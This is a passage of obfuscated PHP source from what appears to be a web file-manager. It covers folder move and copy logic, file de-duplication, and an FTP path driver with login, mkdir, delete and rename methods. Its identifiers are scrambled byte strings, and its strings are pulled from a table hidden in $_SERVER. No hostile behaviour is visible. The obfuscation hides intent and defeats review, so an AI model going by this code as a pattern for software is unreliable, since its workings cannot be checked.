= !0; if ($ëªÅ¼·°) { $Œ‰ˆù€•[$öÛşä‡[634]][] = $‚½Ù¥´È[$öÛşä‡[543]]; } } } } } if ($·ÀæøÍÑ && !$Œ‰ˆù€•[$öÛşä‡[665]]) { $Œ‰ˆù€•[$öÛşä‡[665]] = !0; } return $Š‹€Èúú; } private function _moveForce($†¹ƒ“÷ı, $ï§ŞÊŸ”, $ü ¨ —š) { $ûùØøáÜ =& $_SERVER[¶Ô„œ…¯]; $ƒ¬¦ÆéÃ = $this->sourceInfo($†¹ƒ“÷ı); $†çà“¬ = $this->sourceInfo($ï§ŞÊŸ”); $àŠ¹Š¤® = $ƒ¬¦ÆéÃ[$ûùØøáÜ[487]] == $ûùØøáÜ[91]; $×êÌË‘ù = array($ûùØøáÜ[479] => $†çà“¬[$ûùØøáÜ[193]], $ûùØøáÜ[657] => $†çà“¬[$ûùØøáÜ[586]] . $†çà“¬[$ûùØøáÜ[193]] . $ûùØøáÜ[50], $ûùØøáÜ[653] => $†çà“¬[$ûùØøáÜ[190]], $ûùØøáÜ[654] => $†çà“¬[$ûùØøáÜ[571]], $ûùØøáÜ[656] => USER_ID, $ûùØøáÜ[496] => $ü ¨ —š); $¡İ½•Š÷ = $ƒ¬¦ÆéÃ[$ûùØøáÜ[190]] == SourceModel::TYPE_GROUP && $†çà“¬[$ûùØøáÜ[190]] == SourceModel::TYPE_GROUP && $ƒ¬¦ÆéÃ[$ûùØøáÜ[571]] == $†çà“¬[$ûùØøáÜ[571]]; if (!$¡İ½•Š÷ && $this->moveClearAuth) { Model($ûùØøáÜ[569])->authClear($†¹ƒ“÷ı); } $¶™ñ˜ = $ƒ¬¦ÆéÃ[$ûùØøáÜ[507]] == $ûùØøáÜ[91] && $†çà“¬[$ûùØøáÜ[507]] != $ûùØøáÜ[91]; if ($¶™ñ˜) { $×êÌË‘ù[$ûùØøáÜ[506]] = 0; } if ($àŠ¹Š¤®) { $ÇŞ–Œë = array($ûùØøáÜ[657] => array($ûùØøáÜ[617], $ƒ¬¦ÆéÃ[$ûùØøáÜ[586]] . $ƒ¬¦ÆéÃ[$ûùØøáÜ[193]] . $ûùØøáÜ[618])); $Ôª…ğ¯¿ = $ƒ¬¦ÆéÃ[$ûùØøáÜ[586]] . $ƒ¬¦ÆéÃ[$ûùØøáÜ[193]] . $ûùØøáÜ[50]; $¹İßÓ = $†çà“¬[$ûùØøáÜ[586]] . $†çà“¬[$ûùØøáÜ[193]] . $ûùØøáÜ[50] . $ƒ¬¦ÆéÃ[$ûùØøáÜ[193]] . $ûùØøáÜ[50]; $üŠìÓÙå = array($ûùØøáÜ[657] => array($ûùØøáÜ[666], "\162\x65\x70\x6c\141\x63\x65\50\160\x61\162\x65\156\164\x4c\x65\x76\x65\154\x2c\x27{$Ôª…ğ¯¿}\47\54\47{$¹İßÓ}\47\x29"), $ûùØøáÜ[653] => $†çà“¬[$ûùØøáÜ[190]], $ûùØøáÜ[654] => $†çà“¬[$ûùØøáÜ[571]]); if ($¶™ñ˜) { $üŠìÓÙå[$ûùØøáÜ[506]] = 0; } $this->where($ÇŞ–Œë)->data($üŠìÓÙå)->save(); } $this->where(array($ûùØøáÜ[493] => $†¹ƒ“÷ı))->data($×êÌË‘ù)->save(); return $†¹ƒ“÷ı; } private function clearShare($é„Üã¶Ê, $ó¹éá¥Ö) { $¹ğøÎ”İ =& $_SERVER[¶Ô„œ…¯]; $Á¨´½³é = $this->sourceInfo($é„Üã¶Ê); $Í¤É‚“¦ = $this->sourceInfo($ó¹éá¥Ö); if ($Á¨´½³é[$¹ğøÎ”İ[571]] == $Í¤É‚“¦[$¹ğøÎ”İ[571]] && $Á¨´½³é[$¹ğøÎ”İ[190]] == $¹ğøÎ”İ[667]) { return; } $–Ïğ¬ = array($¹ğøÎ”İ[586] => array($¹ğøÎ”İ[617], $Á¨´½³é[$¹ğøÎ”İ[586]] . $é„Üã¶Ê . $¹ğøÎ”İ[618])); $§—‘ÅÇâ = $this->field($¹ğøÎ”İ[493])->where($–Ïğ¬)->getField($¹ğøÎ”İ[193], !0); if (!$§—‘ÅÇâ) { return; } $–Ïğ¬ = array($¹ğøÎ”İ[193] => array($¹ğøÎ”İ[7], $§—‘ÅÇâ), $¹ğøÎ”İ[668] => 1); $»›àóÓÃ = Model($¹ğøÎ”İ[669])->field($¹ğøÎ”İ[670])->where($–Ïğ¬)->select(); if (!$»›àóÓÃ) { return; } $»›àóÓÃ = array_to_keyvalue($»›àóÓÃ, $¹ğøÎ”İ[12], $¹ğøÎ”İ[670]); $–Ïğ¬ = array($¹ğøÎ”İ[670] => array($¹ğøÎ”İ[7], $»›àóÓÃ)); Model($¹ğøÎ”İ[669])->where($–Ïğ¬)->save(array($¹ğøÎ”İ[668] => 0)); Model($¹ğøÎ”İ[671])->where($–Ïğ¬)->delete(); } public function copyFolderFromIO($âşªÛ‰°, $ôíµû’½, $Š€–ışş, $ßË£éô», $ƒ­‘Û¬¾, $”ØÇ¢•à = false) { $°îùå  =& $_SERVER[¶Ô„œ…¯]; $»š²å½ò = array($°îùå [635] => array(), $°îùå [636] => array(), $°îùå [634] => array(), $°îùå [672] => array()); $¾­ê’ÎÕ = $”ØÇ¢•à ? $”ØÇ¢•à : $âşªÛ‰°->pathThis($ôíµû’½); $£Æ‚˜êü = $this->fileNameExist($Š€–ışş, $¾­ê’ÎÕ); $Ğ©ªô‚Å = $this->mkdir($Š€–ışş, $¾­ê’ÎÕ, $ßË£éô»); if (!$£Æ‚˜êü || $ßË£éô» == REPEAT_RENAME_FOLDER) { $ßË£éô» = !1; } if ($£Æ‚˜êü) { $this->_childrenAllMake($£Æ‚˜êü); } Hook::trigger($°îùå [673]); $this->_copyChildTo($âşªÛ‰°, $ôíµû’½, $Ğ©ªô‚Å, $ßË£éô», $»š²å½ò, $ƒ­‘Û¬¾); Hook::trigger($°îùå [674]); if ($Ğ©ªô‚Å) { $this->folderSizeResetChildren($Ğ©ªô‚Å); } $this->_childrenListClear(); Model($°îùå [637])->addAll($»š²å½ò[$°îùå [635]], array(), !0); Model($°îùå [638])->eventCopy($Ğ©ªô‚Å); $this->saveAll($»š²å½ò[$°îùå [636]]); Model($°îùå [546])->linkAdd($»š²å½ò[$°îùå [634]]); Model($°îùå [546])->remove($»š²å½ò[$°îùå [672]]); $this->folderSizeReset($Š€–ışş); $this->updateModifyTime($Š€–ışş); return $Ğ©ªô‚Å; } private function _copyChildTo($üÈ±Íñ­, $ãÖô³Š, $®˜¼™Ÿ, $­ø‘¥İˆ, &$îã¯¼Éì, $ëæù¥£¥) { $•ãáàÕø =& $_SERVER[¶Ô„œ…¯]; $¬¡­Ì© = $this->sourceInfoCache($®˜¼™Ÿ); $£ŒÌ‘† = $üÈ±Íñ­->listPath($ãÖô³Š); $£ŒÌ‘† = $£ŒÌ‘† ? $£ŒÌ‘† : array($•ãáàÕø[86] => array(), $•ãáàÕø[85] => array()); $ÙÎ÷Æ—» = array_merge($£ŒÌ‘†[$•ãáàÕø[86]], $£ŒÌ‘†[$•ãáàÕø[85]]); $¼‚ëºÍä = $this->_addFiles($üÈ±Íñ­, $£ŒÌ‘†[$•ãáàÕø[86]], $ëæù¥£¥); $¦©Ö®˜Ê = array(); foreach ($ÙÎ÷Æ—» as &$¨Š») { if (isset($¼‚ëºÍä[$¨Š»[$•ãáàÕø[32]]])) { $¨Š» = $¼‚ëºÍä[$¨Š»[$•ãáàÕø[32]]]; } $¨Š»[$•ãáàÕø[487]] = $¨Š»[$•ãáàÕø[33]] == $•ãáàÕø[78]; $¨Š»[$•ãáàÕø[488]] = substr(_get($¨Š», $•ãáàÕø[169], $•ãáàÕø[12]), 0, 10); $¨Š»[$•ãáàÕø[79]] = _get($¨Š», $•ãáàÕø[79], 0); $¨Š»[$•ãáàÕø[543]] = _get($¨Š», $•ãáàÕø[543], 0); if (!isset($¨Š»[$•ãáàÕø[675]]) && $¨Š»[$•ãáàÕø[543]]) { $îã¯¼Éì[$•ãáàÕø[672]][] = $¨Š»[$•ãáàÕø[543]]; } if ($­ø‘¥İˆ) { $ÖİØßá¬ = $this->fileNameExistCache($®˜¼™Ÿ, $¨Š»[$•ãáàÕø[32]]); if ($ÖİØßá¬) { if ($¨Š»[$•ãáàÕø[487]] || $­ø‘¥İˆ == REPEAT_SKIP) { continue; } if ($­ø‘¥İˆ == REPEAT_REPLACE) { $ØâóæÃ§ = $this->sourceInfoCache($ÖİØßá¬); $Íóù»â‰ = $this->fileHistory($ØâóæÃ§, $¨Š»[$•ãáàÕø[543]], $¨Š»[$•ãáàÕø[79]]); if ($Íóù»â‰) { $îã¯¼Éì[$•ãáàÕø[634]][] = $¨Š»[$•ãáàÕø[543]]; } continue; } else { if ($­ø‘¥İˆ == REPEAT_RENAME) { $¨Š»[$•ãáàÕø[32]] = $this->fileNameAutoCache($®˜¼™Ÿ, $¨Š»[$•ãáàÕø[32]], $­ø‘¥İˆ, !1); } } } } if (!$¨Š»[$•ãáàÕø[487]] && $¨Š»[$•ãáàÕø[543]] == 0) { continue; } if (!$¨Š»[$•ãáàÕø[487]] && $¨Š»[$•ãáàÕø[543]]) { $îã¯¼Éì[$•ãáàÕø[634]][] = $¨Š»[$•ãáàÕø[543]]; } $¦©Ö®˜Ê[] = $this->_makeItemData($¨Š», $¬¡­Ì©, $¨Š»[$•ãáàÕø[32]]); } unset($¨Š»); if (!empty($¦©Ö®˜Ê)) { $this->addAll($¦©Ö®˜Ê); $this->_childrenListSelect($®˜¼™Ÿ); } $«ß“Ùê = $this->_childrenList($®˜¼™Ÿ); $«ß“Ùê = array_to_keyvalue($«ß“Ùê, $•ãáàÕø[32]); foreach ($ÙÎ÷Æ—» as $¨Š») { $ØâóæÃ§ = $«ß“Ùê[$¨Š»[$•ãáàÕø[32]]]; $¨§†‹£× = $ØâóæÃ§[$•ãáàÕø[193]]; $this->_copyApplyMeta($ØâóæÃ§, $îã¯¼Éì); if ($¨Š»[$•ãáàÕø[33]] == $•ãáàÕø[78]) { $¨Š»[$•ãáàÕø[87]] = $üÈ±Íñ­->getPathInner($¨Š»[$•ãáàÕø[87]]); $this->_copyChildTo($üÈ±Íñ­, $¨Š»[$•ãáàÕø[87]], $¨§†‹£×, $­ø‘¥İˆ, $îã¯¼Éì, $ëæù¥£¥); } } } private function _addFiles($ÀËúÕ¸¥, $Ê•œ±¬, $É°Šá˜) { $ĞßıµÃƒ =& $_SERVER[¶Ô„œ…¯]; if (!$Ê•œ±¬ || count($Ê•œ±¬) == 0) { return array(); } $’Ÿˆ¸‰Õ = array(); foreach ($Ê•œ±¬ as &$ÙùÖ¾Ñè) { Hook::trigger($ĞßıµÃƒ[676], $ÙùÖ¾Ñè); $ÙùÖ¾Ñè[$ĞßıµÃƒ[87]] = $ÀËúÕ¸¥->getPathInner($ÙùÖ¾Ñè[$ĞßıµÃƒ[87]]); $°ÅÖüØ = $ÀËúÕ¸¥->hashSimple($ÙùÖ¾Ñè[$ĞßıµÃƒ[87]]); $şÅè²‘ = $ÀËúÕ¸¥->hashMd5($ÙùÖ¾Ñè[$ĞßıµÃƒ[87]]); if (strlen($şÅè²‘) > 10 && !isset($’Ÿˆ¸‰Õ[$şÅè²‘])) { $’Ÿˆ¸‰Õ[$şÅè²‘] = array(); } $ÙùÖ¾Ñè[$ĞßıµÃƒ[677]] = $°ÅÖüØ; $ÙùÖ¾Ñè[$ĞßıµÃƒ[549]] = $şÅè²‘; $’Ÿˆ¸‰Õ[$şÅè²‘][] =& $ÙùÖ¾Ñè; if (count($’Ÿˆ¸‰Õ[$şÅè²‘]) > 1) { $ÙùÖ¾Ñè[$ĞßıµÃƒ[675]] = !0; } Hook::trigger($ĞßıµÃƒ[678], $ÙùÖ¾Ñè); } unset($ÙùÖ¾Ñè); $•Ò¶ß¼‰ = array($ĞßıµÃƒ[549] => array($ĞßıµÃƒ[7], array_keys($’Ÿˆ¸‰Õ))); $ë„µì„ò = Model($ĞßıµÃƒ[679]); $ğ“Ü˜“İ = $ë„µì„ò->where($•Ò¶ß¼‰)->select(); $ğ“Ü˜“İ = $ğ“Ü˜“İ ? $ğ“Ü˜“İ : array(); foreach ($ğ“Ü˜“İ as $¤éÅ©Ë‚) { if (!isset($’Ÿˆ¸‰Õ[$¤éÅ©Ë‚[$ĞßıµÃƒ[549]]])) { continue; } $ôÏ„•á = $’Ÿˆ¸‰Õ[$¤éÅ©Ë‚[$ĞßıµÃƒ[549]]]; foreach ($ôÏ„•á as &$ÙùÖ¾Ñè) { $ÙùÖ¾Ñè[$ĞßıµÃƒ[543]] = $¤éÅ©Ë‚[$ĞßıµÃƒ[543]]; $ÙùÖ¾Ñè[$ĞßıµÃƒ[675]] = !0; } unset($ÙùÖ¾Ñè); } $¸ç±‡Ê = array(); foreach ($Ê•œ±¬ as $‡¢úÕñ) { Hook::trigger($ĞßıµÃƒ[680], $‡¢úÕñ); if (isset($‡¢úÕñ[$ĞßıµÃƒ[675]]) && $‡¢úÕñ[$ĞßıµÃƒ[675]]) { Hook::trigger($ĞßıµÃƒ[681], $‡¢úÕñ); continue; } $¨Õèâı’ = $ÀËúÕ¸¥->getPathInner($‡¢úÕñ[$ĞßıµÃƒ[87]]); $ø—šßá = $ë„µì„ò->addFileMake($¨Õèâı’, $‡¢úÕñ[$ĞßıµÃƒ[79]], $‡¢úÕñ[$ĞßıµÃƒ[677]], $‡¢úÕñ[$ĞßıµÃƒ[549]], $‡¢úÕñ[$ĞßıµÃƒ[32]], $É°Šá˜); Hook::trigger($ĞßıµÃƒ[681], $‡¢úÕñ); if (!is_array($ø—šßá)) { continue; } $¸ç±‡Ê[] = $ø—šßá; } $ë„µì„ò->addAll($¸ç±‡Ê); $•Ò¶ß¼‰ = array($ĞßıµÃƒ[549] => array($ĞßıµÃƒ[7], array_keys($’Ÿˆ¸‰Õ))); $ğ“Ü˜“İ = $ë„µì„ò->where($•Ò¶ß¼‰)->select(); $ğ“Ü˜“İ = $ğ“Ü˜“İ ? $ğ“Ü˜“İ : array(); foreach ($ğ“Ü˜“İ as $¤éÅ©Ë‚) { if (!isset($’Ÿˆ¸‰Õ[$¤éÅ©Ë‚[$ĞßıµÃƒ[549]]])) { continue; } $Ğª¹À–’ =& $’Ÿˆ¸‰Õ[$¤éÅ©Ë‚[$ĞßıµÃƒ[549]]]; foreach ($Ğª¹À–’ as &$ÙùÖ¾Ñè) { $ÙùÖ¾Ñè[$ĞßıµÃƒ[543]] = $¤éÅ©Ë‚[$ĞßıµÃƒ[543]]; } unset($ÙùÖ¾Ñè); } $ÇÑµƒ = array(); foreach ($Ê•œ±¬ as $äÜ’ä¦“) { $ÇÑµƒ[$äÜ’ä¦“[$ĞßıµÃƒ[32]]] = $äÜ’ä¦“; } return $ÇÑµƒ; } } define($_SERVER[¶Ô„œ…¯][682], $_SERVER[¶Ô„œ…¯][683]); $qwrmlfydpb = $_SERVER[¶Ô„œ…¯][684]; goto aß²ö©ø ´; c·ÉˆéÂåÅ: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($“ÎŸ„û) { parent::__construct(); if (count($“ÎŸ„û) > 0) { $this->_init($“ÎŸ„û); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ÇÄÂ­) { $‚³¦Ã¿ =& $_SERVER[¶Ô„œ…¯]; global $config; $this->appCharset = $config[$‚³¦Ã¿[1447]]; $this->systemCharset = $config[$‚³¦Ã¿[1448]]; if (isset($ÇÄÂ­[$‚³¦Ã¿[1449]]) && $ÇÄÂ­[$‚³¦Ã¿[1449]]) { $this->systemCharset = $ÇÄÂ­[$‚³¦Ã¿[1449]]; } } public function iconvApp($œ«ƒ¼æ) { return $this->iconvTo($œ«ƒ¼æ, $this->systemCharset, $this->appCharset); } public function iconvSystem($§ï÷ñ£í) { return $this->iconvTo($§ï÷ñ£í, $this->appCharset, $this->systemCharset); } public function getPathOuter($øµÕÕââ) { $ö÷²Ÿ¤— =& $_SERVER[¶Ô„œ…¯]; $İÒ¦Šâ¸ = $this->iconvApp($this->pathBase); $øµÕÕââ = $this->iconvApp($øµÕÕââ); if (substr($İÒ¦Šâ¸, 0, 2) == $ö÷²Ÿ¤—[1418]) { $İÒ¦Šâ¸ = BASIC_PATH . substr($İÒ¦Šâ¸, 2); } if (substr($øµÕÕââ, 0, 2) == $ö÷²Ÿ¤—[1418]) { $øµÕÕââ = BASIC_PATH . substr($øµÕÕââ, 2); } $İÒ¦Šâ¸ = KodIO::clear($İÒ¦Šâ¸); $øµÕÕââ = KodIO::clear($øµÕÕââ); $øµÕÕââ = substr($øµÕÕââ, strlen($İÒ¦Šâ¸)); if (empty($this->pathDriver)) { return $øµÕÕââ; } return $this->pathDriver . $ö÷²Ÿ¤—[8] . ltrim($øµÕÕââ, $ö÷²Ÿ¤—[8]); } private function _init($”×›¬¦ê = array()) { $¹çÃÑæ‡ =& $_SERVER[¶Ô„œ…¯]; if (!function_exists($¹çÃÑæ‡[1450])) { throw new Exception(LNG($¹çÃÑæ‡[1451])); } $this->config = $”×›¬¦ê; $this->charsetReset($”×›¬¦ê); foreach ($”×›¬¦ê as $™ˆ¾Ò” => $ÒÆ³Œ™ù) { if (isset($this->{$™ˆ¾Ò”})) { $this->{$™ˆ¾Ò”} = $ÒÆ³Œ™ù; } } return $this->_login($”×›¬¦ê); } private function _login($Ìá®êŒ) { $ØÎªÃ¹ç =& $_SERVER[¶Ô„œ…¯]; static $Î€ãØ¤² = array(); $§º²ØËœ = md5(json_encode($Ìá®êŒ)); if (isset($Î€ãØ¤²[$§º²ØËœ])) { foreach ($Î€ãØ¤²[$§º²ØËœ] as $¥®¬—Öã => $°¶Ò¹•“) { $this->{$¥®¬—Öã} = $°¶Ò¹•“; } return !0; } $éÒ²®Ÿ¡ = parse_url(trim($this->server, $ØÎªÃ¹ç[8])); $this->host = $éÒ²®Ÿ¡[$ØÎªÃ¹ç[208]]; $üŠËôŒï = isset($éÒ²®Ÿ¡[$ØÎªÃ¹ç[207]]) && $éÒ²®Ÿ¡[$ØÎªÃ¹ç[207]] == $ØÎªÃ¹ç[1452] ? !0 : !1; $this->scheme = $üŠËôŒï ? $ØÎªÃ¹ç[1453] : $ØÎªÃ¹ç[1454]; $this->port = isset($éÒ²®Ÿ¡[$ØÎªÃ¹ç[209]]) ? $éÒ²®Ÿ¡[$ØÎªÃ¹ç[209]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($ØÎªÃ¹ç[1455]) . $this->host . $ØÎªÃ¹ç[4] . $this->port, !0); return !1; } $¤ç¢¿çş = @ftp_login($this->connect, $this->username, $this->userpass); if (!$¤ç¢¿çş) { $this->writeLog(LNG($ØÎªÃ¹ç[1456]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $Şñ¢¶Ù = $this->pasv == $ØÎªÃ¹ç[91] ? !0 : !1; @ftp_pasv($this->connect, $Şñ¢¶Ù); $Î€ãØ¤²[$§º²ØËœ] = array($ØÎªÃ¹ç[1457] => $this->connect, $ØÎªÃ¹ç[208] => $this->host, $ØÎªÃ¹ç[207] => $this->scheme, $ØÎªÃ¹ç[209] => $this->port); return $¤ç¢¿çş; } private function _isconn($¶Ò–ùÑ = true) { if (is_resource($this->connect)) { return !0; } if (!$¶Ò–ùÑ) { return !1; } return $this->_login($this->config); } public function mkfile($ê‡ÑÓÏ©, $¼¯ß±™² = '', $Äªºº¤® = REPEAT_RENAME) { if ($this->setContent($ê‡ÑÓÏ©, $¼¯ß±™²)) { return $this->getPathOuter($ê‡ÑÓÏ©); } $this->writeLog(LNG($_SERVER[¶Ô„œ…¯][1458]), !0); return !1; } public function mkdir($¾ÙŞª‹, $›ÙõÜ‚ã = REPEAT_SKIP) { $Ùæ¶ğÎÈ =& $_SERVER[¶Ô„œ…¯]; if (!$¾ÙŞª‹ || $¾ÙŞª‹ == $Ùæ¶ğÎÈ[8]) { return !0; } if (!$this->_isconn()) { return !1; } $¾ÙŞª‹ = $this->iconvSystem($¾ÙŞª‹); if ($this->_isFolder($¾ÙŞª‹) || @ftp_mkdir($this->connect, $¾ÙŞª‹)) { return $this->getPathOuter($¾ÙŞª‹); } if (!$this->mkdir($this->pathFather($¾ÙŞª‹))) { return !1; } if ($¾ÙŞª‹ = @ftp_mkdir($this->connect, $¾ÙŞª‹)) { return $this->getPathOuter($¾ÙŞª‹); } $this->writeLog(__FUNCTION__ . $Ùæ¶ğÎÈ[1459], !0); return !1; } public function copyFile($•ÙÁÓ, $«Šä÷¢ˆ) { if (!$this->_isconn()) { return !1; } $Å¯§¼òã = $this->pathThis($this->iconvSystem($•ÙÁÓ)); $ÇÛóÒ¸Ä = $this->tempFile($Å¯§¼òã); $üšŞÛ‹ı = $this->iconvApp($ÇÛóÒ¸Ä); $this->download($•ÙÁÓ, $üšŞÛ‹ı); $ŠÌ«’Ÿö = $this->upload($«Šä÷¢ˆ, $üšŞÛ‹ı); $this->tempFileRemve($ÇÛóÒ¸Ä); return $ŠÌ«’Ÿö; } public function moveFile($şìù¥Ÿ, $½šºô»‡) { if (!$this->_isconn()) { return !1; } $şìù¥Ÿ = $this->iconvSystem($şìù¥Ÿ); $½šºô»‡ = $this->iconvSystem($½šºô»‡); $¦ˆ—«¦¸ = @ftp_rename($this->connect, $şìù¥Ÿ, $½šºô»‡); if (!$¦ˆ—«¦¸) { $this->writeLog(__FUNCTION__ . $_SERVER[¶Ô„œ…¯][1459], !0); return !1; } return $this->getPathOuter($½šºô»‡); } public function delFile($èåÆĞ€›) { if (!$this->_isconn()) { return !1; } $èåÆĞ€› = $this->iconvSystem($èåÆĞ€›); $Õú²ªø = @ftp_delete($this->connect, $èåÆĞ€›); if (!$Õú²ªø) { $this->writeLog(__FUNCTION__ . $_SERVER[¶Ô„œ…¯][1459], !0); } return $Õú²ªø; } public function delFolder($ê‡ˆ…Ìô) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ûè°¤˜ë = $ıÀÏ¨ŠÂ = array(); $this->fileList($ê‡ˆ…Ìô, $ûè°¤˜ë, $ıÀÏ¨ŠÂ, !0); $this->listItemCache = !0; foreach ($ıÀÏ¨ŠÂ as $ô†•€’) { $„¾÷Œ… = $this->iconvSystem($ô†•€’[$_SERVER[¶Ô„œ…¯][32]]); $À¸ç±³ = @ftp_delete($this->connect, $„¾÷Œ…); if (!$À¸ç±³) { return !1; } } foreach ($ûè°¤˜ë as $„¾÷Œ…) { $„¾÷Œ… = $this->iconvSystem($„¾÷Œ…); $À¸ç±³ = @ftp_rmdir($this->connect, $„¾÷Œ…); if (!$À¸ç±³) { return !1; } } $ê‡ˆ…Ìô = $this->iconvSystem($ê‡ˆ…Ìô); return @ftp_rmdir($this->connect, $ê‡ˆ…Ìô); } public function rename($©¤°˜Ï¥, $€´Ü¼»À) { $ô ‹Ô¨ =& $_SERVER[¶Ô„œ…¯]; if (!$this->_isconn()) { return !1; } $íçêÛİş = $this->fileNameAuto($this->pathFather($©¤°˜Ï¥), $€´Ü¼»À); $íçêÛİş = $this->iconvSystem($íçêÛİş); $©¤°˜Ï¥ = $this->iconvSystem($©¤°˜Ï¥); $×à¸Ù“ = $this->pathFather($©¤°˜Ï¥); $ÃÓæˆ¾› = rtrim($×à¸Ù“, $ô ‹Ô¨[8]) . $ô ‹Ô¨[8] . $íçêÛİş; $©áè³ˆ = @ftp_rename($this->connect, $©¤°˜Ï¥, $ÃÓæˆ¾›); if (!$©áè³ˆ) { $this->writeLog(__FUNCTION__ . $ô ‹Ô¨[1459], !0); return !1; } $ÃÓæˆ¾› = $this->iconvApp($ÃÓæˆ¾›); return $this->getPathOuter($ÃÓæˆ¾›); } private function folderInfo($³ñè±İ™, $¶œİÛíÏ = false) { $Ó¾†™°ù =& $_SERVER[¶Ô„œ…¯]; $ „öàÒ™ = array($Ó¾†™°ù[32] => $this->pathThis($³ñè±İ™), $Ó¾†™°ù[87] => $this->getPathOuter($Ó¾†™°ù[8] . $³ñè±İ™), $Ó¾†™°ù[33] => $Ó¾†™°ù[78]); if ($¶œİÛíÏ) { return $ „öàÒ™; } $ „öàÒ™[$Ó¾†™°ù[233]] = $ „öàÒ™[$Ó¾†™°ù[88]] = 0; $ „öàÒ™[$Ó¾†™°ù[234]] = $ „öàÒ™[$Ó¾†™°ù[235]] = !0; return $ „öàÒ™; } private function fileInfo($„ÒØ‰Ÿ, $Ÿø¸ÏèŒ = false, $òØ´”ƒ… = array()) { $ÛÆØœÙ‡ =& $_SERVER[¶Ô„œ…¯]; $÷ÎÅŠáå = array($ÛÆØœÙ‡[32] => $this->pathThis($„ÒØ‰Ÿ), $ÛÆØœÙ‡[87] => $this->getPathOuter($ÛÆØœÙ‡[8] . $„ÒØ‰Ÿ), $ÛÆØœÙ‡[33] => $ÛÆØœÙ‡[232], $ÛÆØœÙ‡[79] => isset($òØ´”ƒ…[$ÛÆØœÙ‡[79]]) ? $òØ´”ƒ…[$ÛÆØœÙ‡[79]] : 0, $ÛÆØœÙ‡[169] => $this->ext($„ÒØ‰Ÿ)); if ($Ÿø¸ÏèŒ) { return $÷ÎÅŠáå; } $÷ÎÅŠáå[$ÛÆØœÙ‡[233]] = $÷ÎÅŠáå[$ÛÆØœÙ‡[88]] = 0; $÷ÎÅŠáå[$ÛÆØœÙ‡[234]] = $÷ÎÅŠáå[$ÛÆØœÙ‡[235]] = !0; $í›ğàïà = $this->iconvSystem($„ÒØ‰Ÿ); $÷ÎÅŠáå[$ÛÆØœÙ‡[88]] = @ftp_mdtm($this->connect, $í›ğàïà); if (empty($òØ´”ƒ…)) { $òØ´”ƒ… = $this->objectMeta($„ÒØ‰Ÿ); if (!$òØ´”ƒ…) { return $÷ÎÅŠáå; } } $÷ÎÅŠáå[$ÛÆØœÙ‡[79]] = $òØ´”ƒ…[$ÛÆØœÙ‡[79]]; return $÷ÎÅŠáå; } public function size($…€¨ë‡³) { $úì“È² = $this->objectMeta($…€¨ë‡³); return $úì“È² ? $úì“È²[$_SERVER[¶Ô„œ…¯][79]] : 0; } public function info($ş’ãÓ×Ö) { if ($this->isFile($ş’ãÓ×Ö)) { return $this->fileInfo($ş’ãÓ×Ö, 0); } else { if ($this->isFolder($ş’ãÓ×Ö)) { return $this->folderInfo($ş’ãÓ×Ö); } } return !1; } private function fileList($¹·²ï, &$Ø÷Õõ“, &$ÖÕå÷­«, $¼¿áÀ¯¼ = false) { $ÈŞÀÃæÙ =& $_SERVER[¶Ô„œ…¯]; $¹·²ï = $this->iconvSystem($¹·²ï); if (!$this->isFolder($¹·²ï)) { return !1; } @ftp_chdir($this->connect, $ÈŞÀÃæÙ[8]); $¹·²ï = rtrim($¹·²ï, $ÈŞÀÃæÙ[8]) . $ÈŞÀÃæÙ[8]; check_abort(); $ÕúÎ£èÏ = @ftp_rawlist($this->connect, $¹·²ï); if (!$ÕúÎ£èÏ) { $ÕúÎ£èÏ = array(); } $´øœ°‡ò = array($ÈŞÀÃæÙ[10] => 1, $ÈŞÀÃæÙ[1370] => 1); foreach ($ÕúÎ£èÏ as $ Ç¤÷ˆ°) { $è¦›Ì›Ì = $this->_listItem($ Ç¤÷ˆ°); if ($è¦›Ì›Ì[0] == $ÈŞÀÃæÙ[836]) { continue; } $Ù˜¦ ©¶ = $è¦›Ì›Ì[8]; if (empty($Ù˜¦ ©¶) && $Ù˜¦ ©¶ !== $ÈŞÀÃæÙ[230] || isset($´øœ°‡ò[$Ù˜¦ ©¶])) { continue; } $Ù˜¦ ©¶ = $this->iconvApp($¹·²ï . ltrim($Ù˜¦ ©¶, $ÈŞÀÃæÙ[8])); $ºşëôÂÁ = array($ÈŞÀÃæÙ[32] => $Ù˜¦ ©¶, $ÈŞÀÃæÙ[33] => $ÈŞÀÃæÙ[232], $ÈŞÀÃæÙ[79] => $è¦›Ì›Ì[4]); if (substr($ Ç¤÷ˆ°, 0, 1) == $ÈŞÀÃæÙ[1460]) { $ºşëôÂÁ[$ÈŞÀÃæÙ[33]] = $ÈŞÀÃæÙ[78]; $ºşëôÂÁ[$ÈŞÀÃæÙ[79]] = 0; } $”ã¢”°ø = $ºşëôÂÁ[$ÈŞÀÃæÙ[33]] == $ÈŞÀÃæÙ[78] ? !0 : !1; $this->cacheMethodInfoSet($Ù˜¦ ©¶, $”ã¢”°ø, $ºşëôÂÁ); if ($”ã¢”°ø) { $Ø÷Õõ“[] = $Ù˜¦ ©¶; if ($¼¿áÀ¯¼) { $this->fileList($Ù˜¦ ©¶, $Ø÷Õõ“, $ÖÕå÷­«, $¼¿áÀ¯¼); } continue; } $ÖÕå÷­«[] = $ºşëôÂÁ; } $this->cacheMethodInfoSet($¹·²ï, !0); } private function _listItem($ğÒïÍ‹¡) { if (empty($ğÒïÍ‹¡)) { return array(); } $ˆ¥Û‹Û¨ = preg_split($_SERVER[¶Ô„œ…¯][1461], $ğÒïÍ‹¡); if (count($ˆ¥Û‹Û¨) <= 9) { return $ˆ¥Û‹Û¨; } $ˆ¥Û‹Û¨[8] = trim(substr($ğÒïÍ‹¡, strpos($ğÒïÍ‹¡, $ˆ¥Û‹Û¨[7]) + strlen($ˆ¥Û‹Û¨[7]))); return array_splice($ˆ¥Û‹Û¨, 0, 9); } public function listPath($ŸŠœ, $ëğñÅô¹ = false) { $—Ãë’¬Ä =& $_SERVER[¶Ô„œ…¯]; if (!$this->_isconn()) { return !1; } $«ÕâğÖÂ = $ò÷¨ûˆ = array(); $this->fileList($ŸŠœ, $«ÕâğÖÂ, $ò÷¨ûˆ); foreach ($«ÕâğÖÂ as 